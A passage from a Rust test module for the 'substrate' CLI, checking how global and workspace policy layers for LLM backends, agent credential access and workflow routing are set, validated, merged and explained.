                .and_then(|v| v.as_str()),
            Some("cli:codex")
        );
        assert_eq!(
            global_json
                .pointer("/agents/allowed_backends/0")
                .and_then(|v| v.as_str()),
            Some("cli:codex")
        );
        assert_eq!(
            global_json
                .pointer("/workflow/router/enabled")
                .and_then(|v| v.as_bool()),
            Some(true)
        );

        let workspace = fixture.run_substrate(
            &cwd,
            &[
                "policy",
                "workspace",
                "set",
                "--json",
                "llm.fail_closed.routing=false",
                "agents.host_credentials.read.allowed_backends=[\"cli:codex\"]",
                "workflow.router.allowed_workflow_ids=[\"workflow-workspace\"]",
            ],
        );
        assert!(
            workspace.status.success(),
            "policy workspace set should accept LACP0 keys: {workspace:?}"
        );
        let workspace_json: serde_json::Value =
            serde_json::from_slice(&workspace.stdout).expect("workspace set JSON parse");
        assert_eq!(
            workspace_json
                .pointer("/llm/fail_closed/routing")
                .and_then(|v| v.as_bool()),
            Some(false)
        );
        assert_eq!(
            workspace_json
                .pointer("/agents/host_credentials/read/allowed_backends/0")
                .and_then(|v| v.as_str()),
            Some("cli:codex")
        );
        assert_eq!(
            workspace_json
                .pointer("/workflow/router/allowed_workflow_ids/0")
                .and_then(|v| v.as_str()),
            Some("workflow-workspace")
        );
    }

    #[test]
    #[serial]
    fn c0_policy_global_set_rejects_unknown_and_invalid_lacp0_updates_with_exit_2() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();
        let cwd = fixture.child_dir();

        let unknown = fixture.run_substrate(
            &cwd,
            &["policy", "global", "set", "--json", "llm.unknown_key=true"],
        );
        assert_eq!(
            unknown.status.code(),
            Some(2),
            "unknown policy key should exit 2: {unknown:?}"
        );

        let invalid_value = fixture.run_substrate(
            &cwd,
            &[
                "policy",
                "global",
                "set",
                "--json",
                "workflow.router.enabled=maybe",
            ],
        );
        assert_eq!(
            invalid_value.status.code(),
            Some(2),
            "invalid workflow.router.enabled value should exit 2: {invalid_value:?}"
        );
    }

    #[test]
    #[serial]
    fn c0_policy_global_set_rejects_malformed_backend_ids_for_lacp0_keys() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();
        let cwd = fixture.child_dir();

        for key in [
            "llm.allowed_backends",
            "agents.allowed_backends",
            "agents.host_credentials.read.allowed_backends",
        ] {
            let update = format!("{key}=[\"CLI:Codex\"]");
            let output =
                fixture.run_substrate(&cwd, &["policy", "global", "set", "--json", &update]);
            assert_eq!(
                output.status.code(),
                Some(2),
                "malformed backend id for {key} should exit 2: {output:?}"
            );
            let stderr = String::from_utf8_lossy(&output.stderr);
            assert!(
                stderr.contains(key) || stderr.contains("invalid"),
                "stderr should mention backend id validation for {key}\nstderr: {stderr}"
            );
        }
    }

    #[test]
    #[serial]
    fn c0_policy_current_show_explain_includes_lacp0_keys_with_provenance() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();
        fixture.write_global_policy(
            r#"
llm:
  fail_closed:
    routing: false
  allowed_backends:
    - cli:codex
agents:
  allowed_backends:
    - cli:codex
workflow:
  router:
    enabled: true
"#,
        );
        fixture.write_workspace_policy(
            r#"
llm:
  allowed_backends:
    - api:openai
agents:
  host_credentials:
    read:
      allowed_backends:
        - cli:codex
workflow:
  router:
    allowed_rule_ids:
      - rule-workspace
"#,
        );

        let cwd = fixture.child_dir();
        let output =
            fixture.run_substrate(&cwd, &["policy", "current", "show", "--json", "--explain"]);
        assert!(
            output.status.success(),
            "policy current show --explain should succeed: {output:?}"
        );

        let json: serde_json::Value =
            serde_json::from_slice(&output.stdout).expect("policy JSON parse");
        assert_eq!(
            json.pointer("/llm/fail_closed/routing")
                .and_then(|v| v.as_bool()),
            Some(false)
        );
        assert_eq!(
            json.pointer("/llm/allowed_backends/0")
                .and_then(|v| v.as_str()),
            Some("api:openai")
        );
        assert_eq!(
            json.pointer("/agents/allowed_backends/0")
                .and_then(|v| v.as_str()),
            Some("cli:codex")
        );
        assert_eq!(
            json.pointer("/agents/host_credentials/read/allowed_backends/0")
                .and_then(|v| v.as_str()),
            Some("cli:codex")
        );
        assert_eq!(
            json.pointer("/workflow/router/enabled")
                .and_then(|v| v.as_bool()),
            Some(true)
        );
        assert_eq!(
            json.pointer("/workflow/router/allowed_rule_ids/0")
                .and_then(|v| v.as_str()),
            Some("rule-workspace")
        );

        let explain: serde_json::Value =
            serde_json::from_slice(&output.stderr).expect("policy explain JSON parse");
        assert_eq!(
            explain_layers(&explain, "llm.fail_closed.routing"),
            vec!["global_patch".to_string()]
        );
        assert_eq!(
            explain_layers(&explain, "llm.allowed_backends"),
            vec!["workspace_patch".to_string()]
        );
        assert_eq!(
            explain_layers(&explain, "agents.allowed_backends"),
            vec!["global_patch".to_string()]
        );
        assert_eq!(
            explain_layers(&explain, "agents.host_credentials.read.allowed_backends"),
            vec!["workspace_patch".to_string()]
        );
        assert_eq!(
            explain_layers(&explain, "workflow.router.enabled"),
            vec!["global_patch".to_string()]
        );
        assert_eq!(
            explain_layers(&explain, "workflow.router.allowed_rule_ids"),
            vec!["workspace_patch".to_string()]
        );
    }

    #[test]
    #[serial]
    fn c0_policy_current_show_explain_treats_empty_tuple_constraint_lists_as_workspace_replacements(
    ) {
        for (key, pointer, global_value) in [
            (
                "llm.constraints.routers",
                "/llm/constraints/routers",
                "substrate_gateway",
            ),
            (
                "llm.constraints.providers",
                "/llm/constraints/providers",
                "openai",
            ),
            (
                "llm.constraints.protocols",
                "/llm/constraints/protocols",
                "openai.responses",
            ),
            (
                "llm.constraints.auth_authorities",
                "/llm/constraints/auth_authorities",
                "openai_api_key",
            ),
        ] {
            let fixture = Fixture::new();
            fixture.write_workspace_marker();
            fixture.write_global_policy(&format!(
                "llm:\n  constraints:\n    {}:\n      - {}\n",
                key.rsplit('.').next().expect("constraint leaf key"),
                global_value
            ));
            fixture.write_workspace_policy(&format!(
                "llm:\n  constraints:\n    {}: []\n",
                key.rsplit('.').next().expect("constraint leaf key")
            ));

            let cwd = fixture.child_dir();
            let output =
                fixture.run_substrate(&cwd, &["policy", "current", "show", "--json", "--explain"]);
            assert!(
                output.status.success(),
                "policy current show --explain should succeed for {key}: {output:?}"
            );

            let json: serde_json::Value =
                serde_json::from_slice(&output.stdout).expect("policy JSON parse");
            assert_eq!(
                json.pointer(pointer),
                Some(&serde_json::Value::Array(Vec::new())),
                "expected workspace [] to replace global tuple constraint for {key}: {json}"
            );

            let explain: serde_json::Value =
                serde_json::from_slice(&output.stderr).expect("policy explain JSON parse");
            assert_eq!(
                explain_layers(&explain, key),
                vec!["workspace_patch".to_string()],
                "expected explain provenance to show workspace replacement for {key}"
            );
        }
    }

    #[test]
    #[serial]
    fn c0_policy_global_set_rejects_invalid_or_unknown_tuple_constraint_updates_with_exit_2() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();
        let cwd = fixture.child_dir();

        for (update, expected_hint) in [
            (
                "llm.constraints.routers=[\"Substrate_Gateway\"]",
                "llm.constraints.routers",
            ),
            (
                "llm.constraints.providers=[\"openai-responses\"]",
                "llm.constraints.providers",
            ),
            (
                "llm.constraints.protocols=[\"openai\"]",
                "llm.constraints.protocols",
            ),
            (
                "llm.constraints.auth_authorities=[\"OpenAI_API_Key\"]",
                "llm.constraints.auth_authorities",
            ),
            (
                "llm.constraints.clients=[\"human\"]",
                "llm.constraints.clients",
            ),
        ] {
            let output =
                fixture.run_substrate(&cwd, &["policy", "global", "set", "--json", update]);
            assert_eq!(
                output.status.code(),
                Some(2),
                "tuple-constraint update should exit 2 for {update}: {output:?}"
            );

            let stderr = String::from_utf8_lossy(&output.stderr);
            assert!(
                stderr.contains(expected_hint)
                    || stderr.contains("invalid")
                    || stderr.contains("unknown field"),
                "stderr should explain the tuple-constraint failure for {update}\nstderr: {stderr}"
            );
        }
    }

    #[test]
    #[serial]
    fn c0_shell_side_policy_json_and_yaml_display_include_lacp0_sections() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();
        let cwd = fixture.child_dir();

        let show_json = fixture.run_substrate(&cwd, &["policy", "current", "show", "--json"]);
        assert!(
            show_json.status.success(),
            "policy current show --json should succeed: {show_json:?}"
        );
        let json: serde_json::Value =
            serde_json::from_slice(&show_json.stdout).expect("policy JSON parse");
        assert!(
            json.get("llm").is_some(),
            "missing llm in policy JSON: {json}"
        );
        assert!(
            json.get("agents").is_some(),
            "missing agents in policy JSON: {json}"
        );
        assert!(
            json.pointer("/agents/world_dispatch").is_some(),
            "missing agents.world_dispatch in policy JSON: {json}"
        );
        assert!(
            json.pointer("/workflow/router").is_some(),
            "missing workflow.router in policy JSON: {json}"
        );

        let show_yaml = fixture.run_substrate(&cwd, &["policy", "current", "show"]);
        assert!(
            show_yaml.status.success(),
            "policy current show (YAML) should succeed: {show_yaml:?}"
        );
        let yaml: serde_yaml::Value =
            serde_yaml::from_slice(&show_yaml.stdout).expect("policy YAML parse");
        let root = yaml.as_mapping().expect("policy YAML root mapping");
        let llm = root
            .get(serde_yaml::Value::String("llm".to_string()))
            .and_then(|value| value.as_mapping());
        let agents = root
            .get(serde_yaml::Value::String("agents".to_string()))
            .and_then(|value| value.as_mapping());
        let workflow_router = root
            .get(serde_yaml::Value::String("workflow".to_string()))
            .and_then(|value| value.as_mapping())
            .and_then(|workflow| workflow.get(serde_yaml::Value::String("router".to_string())))
            .and_then(|value| value.as_mapping());
        assert!(
            llm.is_some(),
            "missing llm mapping in policy YAML: {yaml:?}"
        );
        assert!(
            agents.is_some(),
            "missing agents mapping in policy YAML: {yaml:?}"
        );
        assert!(
            agents
                .and_then(|agents| {
                    agents
                        .get(serde_yaml::Value::String("world_dispatch".to_string()))
                        .and_then(|value| value.as_mapping())
                })
                .is_some(),
            "missing agents.world_dispatch mapping in policy YAML: {yaml:?}"
        );
        assert!(
            workflow_router.is_some(),
            "missing workflow.router mapping in policy YAML: {yaml:?}"
        );
    }

    #[test]
    #[serial]
    fn c0_broker_merges_sparse_global_and_workspace_patches() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();

        fixture.write_global_policy(
            r#"
cmd_allowed:
  - global-allowed
"#,
        );
        fixture.write_workspace_policy(
            r#"
metadata:
  workspace: "true"
"#,
        );

        let cwd = fixture.child_dir();
        let _env = EnvVarGuard::set("SUBSTRATE_HOME", &fixture.substrate_home);
        let (policy, _source) = crate::effective_policy::load_effective_policy_for_cwd(&cwd)
            .expect("broker should resolve effective policy via patch merge");

        assert_eq!(policy.cmd_allowed, vec!["global-allowed".to_string()]);
        assert_eq!(
            policy.metadata.get("workspace").map(String::as_str),
            Some("true")
        );
    }

    #[test]
    #[serial]
    fn c0_broker_workspace_disabled_ignores_workspace_patch() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();
        fixture.write_workspace_disabled();

        fixture.write_global_policy(&full_policy_yaml_with_cmd_allowed(
            "global",
            &["global-allowed"],
        ));
        fixture.write_workspace_policy(&full_policy_yaml_with_cmd_allowed(
            "workspace",
            &["workspace-allowed"],
        ));

        let cwd = fixture.child_dir();
        let _env = EnvVarGuard::set("SUBSTRATE_HOME", &fixture.substrate_home);
        let (policy, _source) = crate::effective_policy::load_effective_policy_for_cwd(&cwd)
            .expect("broker should resolve policy for cwd");

        assert_eq!(
            policy.cmd_allowed,
            vec!["global-allowed".to_string()],
            "workspace.disabled should prevent workspace policy from affecting broker effective policy"
        );
    }

    #[test]
    #[serial]
    fn c0_effective_policy_is_identical_across_broker_and_cli_show_and_explain() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();

        fixture.write_global_policy(
            r#"
cmd_allowed:
  - global-allowed
"#,
        );
        fixture.write_workspace_policy(
            r#"
metadata:
  workspace: "true"
"#,
        );

        let cwd = fixture.child_dir();

        let _env = EnvVarGuard::set("SUBSTRATE_HOME", &fixture.substrate_home);
        let (broker_policy, _source) = crate::effective_policy::load_effective_policy_for_cwd(&cwd)
            .expect("broker should resolve effective policy via patch merge");
        let broker_json = super::effective_policy_display_json_v3(&broker_policy);

        let show = fixture.run_substrate(&cwd, &["policy", "current", "show", "--json"]);
        assert!(
            show.status.success(),
            "expected `substrate policy current show` to succeed: {show:?}"
        );
        assert!(
            String::from_utf8_lossy(&show.stderr).contains("effective merged policy"),
            "expected merged-policy note on stderr, got: {}",
            String::from_utf8_lossy(&show.stderr)
        );
        let cli_show_json: serde_json::Value =
            serde_json::from_slice(&show.stdout).expect("policy show should output JSON");

        let explain =
            fixture.run_substrate(&cwd, &["policy", "current", "show", "--json", "--explain"]);
        assert!(
            explain.status.success(),
            "expected `substrate policy current show --explain` to succeed: {explain:?}"
        );
        let cli_explain_json: serde_json::Value = serde_json::from_slice(&explain.stdout)
            .expect("policy show --explain should output JSON");

        assert_eq!(
            cli_show_json, cli_explain_json,
            "stdout policy must match with/without --explain"
        );
        assert_eq!(
            cli_show_json, broker_json,
            "effective policy must match across broker and CLI"
        );
    }
}
